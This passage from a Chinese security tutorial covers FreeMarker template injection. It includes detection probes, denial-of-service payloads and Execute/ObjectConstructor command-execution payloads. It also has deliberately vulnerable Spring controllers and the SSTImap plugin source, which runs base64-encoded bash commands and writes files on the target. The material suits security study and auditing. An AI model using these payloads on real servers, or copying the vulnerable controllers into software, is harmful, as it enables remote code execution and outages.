+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;#list 1..10 as i&gt;<br>    &lt;#if i == 5&gt;<br>        &lt;#break&gt;<br>    &lt;/#if&gt;<br>    $&#123;i&#125; |<br>&lt;/#list&gt;<br><br>//输出<br>1 | 2 | 3 | 4 |<br></code></pre></td></tr></table></figure>
+
+<h4 id="内建函数（Built-ins）"><a href="#内建函数（Built-ins）" class="headerlink" title="内建函数（Built-ins）"></a>内建函数（Built-ins）</h4><p>通过 <code>?</code> 调用，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">$&#123;name?upper_case&#125;        // 转大写<br>$&#123;price?string.currency&#125;  // 格式化货币<br>$&#123;list?size&#125;              // 列表长度<br>$&#123;date?date&#125;              // 仅日期部分<br>$&#123;text?html&#125;              // HTML 转义<br>$&#123;text?url&#125;               // URL 编码<br>$&#123;obj?exists&#125;             // 判断是否空值（已弃用，推荐用 ??） ??返回true当且仅当存在且不是 Java 的 null<br></code></pre></td></tr></table></figure>
+
+<h3 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h3><p>不像其他模板的ssti，freemarker的ssti无法通过传参的方式（业务十分少见）来利用，一般需要有模板编辑/上传功能，即需要有能直接编写模板代码的手段。并且在freemarker高版本的配置中能rce的相关功能和函数是默认禁止的。</p>
+<table>
+<thead>
+<tr>
+<th>配置项</th>
+<th>默认值</th>
+<th>风险说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>api_builtin_enabled</code></td>
+<td><code>false</code>（自 2.3.22 起）</td>
+<td>启用后可通过 <code>?api</code>调用 Java 方法</td>
+</tr>
+<tr>
+<td><code>newBuiltinClassResolver </code></td>
+<td><code>UNRESTRICTED_RESOLVER</code>无限制</td>
+<td>可通过 <code>?new</code> 实例化任意类</td>
+</tr>
+<tr>
+<td>允许用户控制模板源码</td>
+<td>—</td>
+<td>最高风险</td>
+</tr>
+<tr>
+<td>数据模型包含危险工具类</td>
+<td>—</td>
+<td>如 <code>Execute</code>, <code>ObjectConstructor</code></td>
+</tr>
+</tbody></table>
+<p>代码审计时查看是否有以下配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">config.setAPIBuiltinEnabled(true);   // 允许 ?api<br>cfg.setNewBuiltinClassResolver(UNRESTRICTED_RESOLVER);   // 允许 ?new<br></code></pre></td></tr></table></figure>
+
+<h4 id="一些探测可利用点的payload"><a href="#一些探测可利用点的payload" class="headerlink" title="一些探测可利用点的payload"></a>一些探测可利用点的payload</h4><ol>
+<li>探测 <code>?api</code> 是否启用</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">$&#123;&quot;a&quot;?api.class.name&#125;<br><br>返回 java.lang.String → ?api 启用 <br>报错 Unknown built-in 或 api is not allowed → 禁用<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>探测 <code>?new</code> 是否启用</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">$&#123;&quot;java.lang.String&quot;?new(&quot;test&quot;)&#125;<br><br>返回 test → ?new 启用 <br>报错 Instantiation of new not allowed → 禁用 <br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>基础信息探测</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">$&#123;1+2&#125;                          → 返回 3（确认是 FreeMarker）<br>$&#123;.now&#125;                         → 返回当前时间<br>$&#123;.version&#125;                     → 返回 FreeMarker 版本（如 2.3.32）<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>模板上下文变量获取</li>
+</ol>
+<ul>
+<li>信息收集：了解模板中有哪些对象可用，从而寻找可利用的入口（如 <code>request</code>、<code>springContext</code>、<code>application</code> 等）。</li>
+<li>判断上下文：确认是否处于 Spring Boot、Struts、自定义应用等环境中。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;.data_model?keys?join(<span class="hljs-string">&#x27;,&#x27;</span>)&#125;<br><br><span class="hljs-comment">//列出当前模板上下文（data model）中所有可用的变量名</span><br>.data_model：FreeMarker 内置变量，表示传递给模板的整个数据模型（即 Java 对象的根上下文）。<br>?keys：获取该模型的所有键（属性名/变量名），返回一个序列（sequence）。<br>?join(<span class="hljs-string">&#x27;,&#x27;</span>)：将序列用逗号连接成字符串。<br><br><span class="hljs-comment">//盲注形式</span><br>$&#123;<span class="hljs-number">1</span>/(((.data_model?keys?join(<span class="hljs-string">&#x27;,&#x27;</span>))?matches(<span class="hljs-string">&#x27;^blabla.*&#x27;</span>)?string(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)?eval))&#125;<br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>其他payload</li>
+</ol>
+<ul>
+<li>通过构造响应超时或者崩溃页面测试payload是否生效</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&#x27;totoooooooooooooooooooooooooo&#x27;</span>?matches(<span class="hljs-string">&#x27;t((.*)*)*x&#x27;</span>)?string&#125;<br><span class="hljs-comment">//create huge list and raise java.lang.OutOfMemoryError: Java heap space</span><br><br>$&#123;(<span class="hljs-number">1.</span><span class="hljs-number">.99999999999999999999999999</span>)?join(<span class="hljs-string">&#x27;,&#x27;</span>)&#125;<br>  <span class="hljs-comment">//内存耗尽攻击（OOM）</span><br><br>$&#123;.locale_object.setDefault(.locale_object.forLanguageTag(<span class="hljs-string">&#x27;jp&#x27;</span>))&#125;<br><span class="hljs-comment">//全局 Locale 篡改</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用场景demo"><a href="#利用场景demo" class="headerlink" title="利用场景demo"></a>利用场景demo</h4><p>用户输入直接作为 FreeMarker 模板源码渲染。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">package org.example.ssti.controller;<br>import freemarker.template.Configuration;<br>import freemarker.template.Template;<br>import freemarker.template.TemplateException;<br>import org.springframework.stereotype.Controller;<br>import org.springframework.web.bind.annotation.GetMapping;<br>import org.springframework.web.bind.annotation.RequestParam;<br><br>import jakarta.servlet.http.HttpServletResponse;<br>import java.io.StringReader;<br>import java.io.IOException;<br>import java.util.HashMap;<br><br>@Controller<br>public class TemplateController &#123;<br><br>    @GetMapping(&quot;/render&quot;)<br>    public void render(@RequestParam String tpl, HttpServletResponse resp) throws IOException &#123;<br>        try &#123;<br>            Configuration cfg = new Configuration(Configuration.VERSION_2_3_34);<br>            Template template = new Template(&quot;user&quot;, new StringReader(tpl), cfg);  //模板完全可控<br>            template.process(new HashMap&lt;&gt;(), resp.getWriter());<br>        &#125; catch (TemplateException e) &#123;<br>            resp.getWriter().write(&quot;Error: &quot; + e.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$%7B.version%7D<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766391969939-806ad589-6151-4579-95c3-41382eb77b21.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">?tpl=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22calc%22%29%7D&quot;<br><br>?tpl=&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;ex(&quot;calc&quot;)&#125;<br><br>?tpl=&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;Calc&quot;).start()&#125;<br><br><br><br></code></pre></td></tr></table></figure>
+
+<p>数据模型包含 <code>Execute</code> 对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">package org.example.ssti.controller;<br>import freemarker.template.Configuration;<br>import freemarker.template.Template;<br>import freemarker.template.TemplateException;<br>import freemarker.template.utility.Execute;<br>import jakarta.servlet.http.HttpServletResponse;<br>import org.springframework.stereotype.Controller;<br>import org.springframework.web.bind.annotation.GetMapping;<br>import org.springframework.web.bind.annotation.RequestParam;<br><br>import java.io.StringReader;<br>import java.io.IOException;<br>import java.util.HashMap;<br><br>@Controller<br>public class TemplateController &#123;<br><br>    @GetMapping(&quot;/render&quot;)<br>    public void render(@RequestParam String cmd, HttpServletResponse resp) throws IOException &#123;<br>        try &#123;<br>            Configuration cfg = new Configuration(Configuration.VERSION_2_3_34);<br>            String tpl = &quot;Output: $&#123;exec(cmd)&#125;&quot;;<br>            Template template = new Template(&quot;fixed&quot;, new StringReader(tpl), cfg);<br><br>            template.process(new HashMap&lt;String, Object&gt;() &#123;&#123;<br>                put(&quot;cmd&quot;, cmd);<br>                put(&quot;exec&quot;, new Execute()); // 注入危险对象<br>            &#125;&#125;, resp.getWriter());<br>        &#125; catch (TemplateException e) &#123;<br>            resp.getWriter().write(&quot;Error: &quot; + e.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766396791079-737263c0-4961-44a8-a281-1c0cb00c577e.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="sstimap"><a href="#sstimap" class="headerlink" title="sstimap"></a>sstimap</h4><p><a target="_blank" rel="noopener" href="https://github.com/vladko312/SSTImap/blob/master/requirements.txt">https://github.com/vladko312/SSTImap/</a></p>
+<p>sstimap支持freemarker的扫描和利用</p>
+<p>在plugins\java\freemarker.py</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs java">from utils <span class="hljs-keyword">import</span> rand<br>from plugins.languages <span class="hljs-keyword">import</span> java<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Freemarker</span>(java.Java):<br>    priority = <span class="hljs-number">5</span><br>    plugin_info = &#123;<br>        <span class="hljs-string">&quot;Description&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;Apache Freemarker template engine&quot;&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Authors&quot;</span>: [<br>            <span class="hljs-string">&quot;Emilio @epinna https://github.com/epinna&quot;</span>,  # Original Tplmap payload<br>            <span class="hljs-string">&quot;Vladislav Korchagin @vladko312 https://github.com/vladko312&quot;</span>,  # Updates <span class="hljs-keyword">for</span> SSTImap<br>            <span class="hljs-string">&quot;Nicolas Verdier @n1nj4sec https://github.com/n1nj4sec&quot;</span>,  # Boolean error-based blind oracle<br>        ],<br>        <span class="hljs-string">&quot;References&quot;</span>: [<br>            <span class="hljs-string">&quot;Writeup: https://gist.github.com/n1nj4sec/5e3fffdfa322f4c23053359fc8100ab9&quot;</span>,<br>        ],<br>        <span class="hljs-string">&quot;Engine&quot;</span>: [<br>            <span class="hljs-string">&quot;Homepage: https://freemarker.apache.org/&quot;</span>,<br>            <span class="hljs-string">&quot;Github: https://github.com/apache/freemarker&quot;</span>,<br>        ],<br>    &#125;<br><br>    def <span class="hljs-title function_">init</span><span class="hljs-params">(self)</span>:<br>        self.update_actions(&#123;<br>            <span class="hljs-string">&#x27;render&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;render&#x27;</span>: <span class="hljs-string">&#x27;&#123;code&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;header&#x27;</span>: <span class="hljs-string">&#x27;$&#123;&#123;(&#123;header[0]&#125;+&#123;header[1]&#125;)?c&#125;&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;trailer&#x27;</span>: <span class="hljs-string">&#x27;$&#123;&#123;(&#123;trailer[0]&#125;+&#123;trailer[1]&#125;)?c&#125;&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_render&#x27;</span>: f<span class="hljs-string">&quot;&quot;&quot;$&#123;&#123;&#123;rand.randints[0]&#125;&#125;&#125;&lt;#--&#123;rand.randints[1]&#125;--&gt;$&#123;&#123;&#123;rand.randints[2]&#125;&#125;&#125;&quot;&quot;&quot;</span>,<br>                <span class="hljs-string">&#x27;test_render_expected&#x27;</span>: f<span class="hljs-string">&#x27;&#123;rand.randints[0]&#125;&#123;rand.randints[2]&#125;&#x27;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;render_error&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;render&#x27;</span>: <span class="hljs-string">&#x27;&#123;code&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;header&#x27;</span>: <span class="hljs-string">&#x27;&lt;#--$&#123;&#123;1/0&#125;&#125;--&gt;$&#123;&#123;((&#123;header[0]&#125;+&#123;header[1]&#125;)?c+&#x27;</span>,<br>                <span class="hljs-string">&#x27;trailer&#x27;</span>: <span class="hljs-string">&#x27;+(&#123;trailer[0]&#125;+&#123;trailer[1]&#125;)?c)?new()&#125;&#125;&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_render&#x27;</span>: f<span class="hljs-string">&quot;&quot;&quot;(&#123;rand.randints[0]&#125;)?c+(&#123;rand.randints[2]&#125;)?c&quot;&quot;&quot;</span>,<br>                <span class="hljs-string">&#x27;test_render_expected&#x27;</span>: f<span class="hljs-string">&#x27;&#123;rand.randints[0]&#125;&#123;rand.randints[2]&#125;&#x27;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;boolean&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;inject&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_bool_true&#x27;</span>:  <span class="hljs-string">&quot;$&#123;1/((1.0==1.0)?string(&#x27;1&#x27;,&#x27;0&#x27;)?eval)&#125;&quot;</span>,<br>                <span class="hljs-string">&#x27;test_bool_false&#x27;</span>: <span class="hljs-string">&quot;$&#123;1/((1.0==0.1)?string(&#x27;1&#x27;,&#x27;0&#x27;)?eval)&#125;&quot;</span>,<br>                <span class="hljs-string">&#x27;verify_bool_true&#x27;</span>:  <span class="hljs-string">&quot;$&#123;1/((2&gt;1)?string(&#x27;1&#x27;,&#x27;0&#x27;)?eval)&#125;&quot;</span>,<br>                <span class="hljs-string">&#x27;verify_bool_false&#x27;</span>: <span class="hljs-string">&quot;$&#123;1/((1&gt;2)?string(&#x27;1&#x27;,&#x27;0&#x27;)?eval)&#125;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;evaluate&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;render&#x27;</span>,<br>                <span class="hljs-string">&#x27;evaluate&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;$&#123;&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;/bin/bash -c &#123;&#123;echo,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&quot;)?eval &#125;&#125;&quot;&quot;&quot;</span>,<br>                <span class="hljs-string">&#x27;test_eval&#x27;</span>: <span class="hljs-string">&#x27;&quot;executed&quot;?replace(&quot;xecu&quot;, &quot;valua&quot;)&#x27;</span>,<br>                <span class="hljs-string">&#x27;test_eval_expected&#x27;</span>: <span class="hljs-string">&#x27;evaluated&#x27;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;evaluate_error&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;render&#x27;</span>,<br>                <span class="hljs-string">&#x27;evaluate&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;(&quot;freemarker.template.utility.Execute&quot;?new()(&quot;/bin/bash -c &#123;&#123;echo,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&quot;)?eval)&quot;&quot;&quot;</span><br>            &#125;,<br>            # Not using execute here since it<span class="hljs-string">&#x27;s rendered and requires set headers and trailers</span><br><span class="hljs-string">            &#x27;</span>evaluate_boolean<span class="hljs-string">&#x27;: &#123;</span><br><span class="hljs-string">                &#x27;</span>call<span class="hljs-string">&#x27;: &#x27;</span>inject<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                &#x27;</span>evaluate_blind<span class="hljs-string">&#x27;: &quot;&quot;&quot;$&#123;&#123;1/(&quot;freemarker.template.utility.Execute&quot;?new()(&quot;bash -c &#123;&#123;echo,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&quot;)?eval?has_content?string(&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)?eval) &#125;&#125;&quot;&quot;&quot;</span><br><span class="hljs-string">            &#125;,</span><br><span class="hljs-string">            &#x27;</span>evaluate_blind<span class="hljs-string">&#x27;: &#123;</span><br><span class="hljs-string">                &#x27;</span>call<span class="hljs-string">&#x27;: &#x27;</span>inject<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                &#x27;</span>evaluate_blind<span class="hljs-string">&#x27;: &quot;&quot;&quot;$&#123;&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;bash -c &#123;&#123;echo,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&quot;)?eval?has_content?string(&quot;freemarker.template.utility.Execute&quot;?new()(&quot;sleep &#123;delay&#125;&quot;),&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;) &#125;&#125;&quot;&quot;&quot;</span><br><span class="hljs-string">            &#125;,</span><br><span class="hljs-string">            &#x27;</span>execute<span class="hljs-string">&#x27;: &#123;</span><br><span class="hljs-string">                &#x27;</span>call<span class="hljs-string">&#x27;: &#x27;</span>render<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                &#x27;</span>execute<span class="hljs-string">&#x27;: &quot;&quot;&quot;$&#123;&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;/bin/bash -c &#123;&#123;eval,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&quot;) &#125;&#125;&quot;&quot;&quot;</span><br><span class="hljs-string">            &#125;,</span><br><span class="hljs-string">            &#x27;</span>execute_error<span class="hljs-string">&#x27;: &#123;</span><br><span class="hljs-string">                &#x27;</span>call<span class="hljs-string">&#x27;: &#x27;</span>render<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                &#x27;</span>execute<span class="hljs-string">&#x27;: &quot;&quot;&quot;(&quot;freemarker.template.utility.Execute&quot;?new()(&quot;/bin/bash -c &#123;&#123;eval,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&quot;))&quot;&quot;&quot;</span><br><span class="hljs-string">            &#125;,</span><br><span class="hljs-string">            # Not using execute here since it&#x27;</span>s rendered and <span class="hljs-keyword">requires</span> set headers and trailers<br>            # Hackish way to check success<br>            <span class="hljs-string">&#x27;execute_boolean&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;call&#x27;</span>: <span class="hljs-string">&#x27;inject&#x27;</span>,<br>                <span class="hljs-string">&#x27;execute_blind&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;$&#123;&#123;1/(&quot;freemarker.template.utility.Execute&quot;?new()(&quot;bash -c &#123;&#123;eval,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&amp;&amp;&#123;&#123;echo,SSTIMAP&#125;&#125;&quot;)?chop_linebreak?ends_with(&quot;SSTIMAP&quot;)?string(&#x27;1&#x27;,&#x27;0&#x27;)?eval) &#125;&#125;&quot;&quot;&quot;</span><br>            &#125;,<br>            # Not using execute here since it<span class="hljs-string">&#x27;s rendered and requires set headers and trailers</span><br><span class="hljs-string">            &#x27;</span>execute_blind<span class="hljs-string">&#x27;: &#123;</span><br><span class="hljs-string">                &#x27;</span>call<span class="hljs-string">&#x27;: &#x27;</span>inject<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                &#x27;</span>execute_blind<span class="hljs-string">&#x27;: &quot;&quot;&quot;$&#123;&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;bash -c &#123;&#123;eval,$(&#123;&#123;tr,/+,_-&#125;&#125;&lt;&lt;&lt;&#123;code_b64&#125;|&#123;&#123;base64,-d&#125;&#125;)&#125;&#125;&amp;&amp;&#123;&#123;sleep,&#123;delay&#125;&#125;&#125;&quot;) &#125;&#125;&quot;&quot;&quot;</span><br><span class="hljs-string">            &#125;,</span><br><span class="hljs-string">            &#x27;</span>write<span class="hljs-string">&#x27;: &#123;</span><br><span class="hljs-string">                &#x27;</span>call<span class="hljs-string">&#x27;: &#x27;</span>inject<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                &#x27;</span>write<span class="hljs-string">&#x27;: &quot;&quot;&quot;$&#123;&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;bash -c &#123;&#123;tr,_-,/+&#125;&#125;&lt;&lt;&lt;&#123;chunk_b64&#125;|&#123;&#123;base64,-d&#125;&#125;&gt;&gt;&#123;path&#125;&quot;) &#125;&#125;&quot;&quot;&quot;,</span><br><span class="hljs-string">                &#x27;</span>truncate<span class="hljs-string">&#x27;: &quot;&quot;&quot;$&#123;&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;bash -c &#123;&#123;echo,-n,&#125;&#125;&gt;&#123;path&#125;&quot;) &#125;&#125;&quot;&quot;&quot;,</span><br><span class="hljs-string">            &#125;,</span><br><span class="hljs-string">        &#125;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">        self.language += &#x27;</span>:freemarker<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        self.set_contexts([</span><br><span class="hljs-string">            # Text context, no closures</span><br><span class="hljs-string">            &#123;&#x27;</span>level<span class="hljs-string">&#x27;: 0&#125;,</span><br><span class="hljs-string">            &#123;&#x27;</span>level<span class="hljs-string">&#x27;: 1, &#x27;</span>prefix<span class="hljs-string">&#x27;: &#x27;</span>&#123;closure&#125;&#125;&#125;<span class="hljs-string">&#x27;, &#x27;</span>suffix<span class="hljs-string">&#x27;: &#x27;</span><span class="hljs-string">&#x27;, &#x27;</span>closures<span class="hljs-string">&#x27;: java.ctx_closures&#125;,</span><br><span class="hljs-string">            # This handles &lt;#assign s = %s&gt; and &lt;#if 1 == %s&gt; and &lt;#if %s == 1&gt;</span><br><span class="hljs-string">            &#123;&#x27;</span>level<span class="hljs-string">&#x27;: 2, &#x27;</span>prefix<span class="hljs-string">&#x27;: &#x27;</span>&#123;closure&#125;&gt;<span class="hljs-string">&#x27;, &#x27;</span>suffix<span class="hljs-string">&#x27;: &#x27;</span><span class="hljs-string">&#x27;, &#x27;</span>closures<span class="hljs-string">&#x27;: java.ctx_closures&#125;,</span><br><span class="hljs-string">            &#123;&#x27;</span>level<span class="hljs-string">&#x27;: 5, &#x27;</span>prefix<span class="hljs-string">&#x27;: &#x27;</span>--&gt;<span class="hljs-string">&#x27;, &#x27;</span>suffix<span class="hljs-string">&#x27;: &#x27;</span>&lt;#--<span class="hljs-string">&#x27;&#125;,</span><br><span class="hljs-string">            &#123;&#x27;</span>level<span class="hljs-string">&#x27;: 5, &#x27;</span>prefix<span class="hljs-string">&#x27;: &#x27;</span>&#123;closure&#125; as a&gt;&lt;/#list&gt;&lt;#list [<span class="hljs-number">1</span>] as a&gt;<span class="hljs-string">&#x27;, &#x27;</span>suffix<span class="hljs-string">&#x27;: &#x27;</span><span class="hljs-string">&#x27;, &#x27;</span>closures<span class="hljs-string">&#x27;: java.ctx_closures&#125;,</span><br><span class="hljs-string">        ])</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>render用于测试模板是否可被渲染</p>
+<p><img src="/mdimg/javassti/1766413335458-b26a256d-7f09-45c9-b762-0be066a055e5.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用<code>$&#123;xxx&#125;</code>结合注释，预期输出为两个随机数拼接（注释中的数字被丢弃）</p>
+<p>render_error用报错的方式测试模板是否可被渲染，依赖与错误回显/http状态码</p>
